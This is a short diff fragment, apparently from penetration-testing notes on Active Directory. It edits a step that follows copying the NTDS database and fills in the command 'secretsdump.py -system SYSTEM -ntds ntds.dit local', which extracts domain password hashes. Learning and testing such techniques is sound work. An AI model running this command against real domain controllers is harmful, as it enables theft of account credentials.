@@ -27,7 +27,8 @@ the issued command performs a pivotal task: creating a copy of the NTDS and subs
 	```
 	THEN secretsdump.py
 	```bash
-	secretsdump.py 
+	secretsdump.py -system SYSTEM -ntds ntds.dit local 
 	```
+	
 
 	
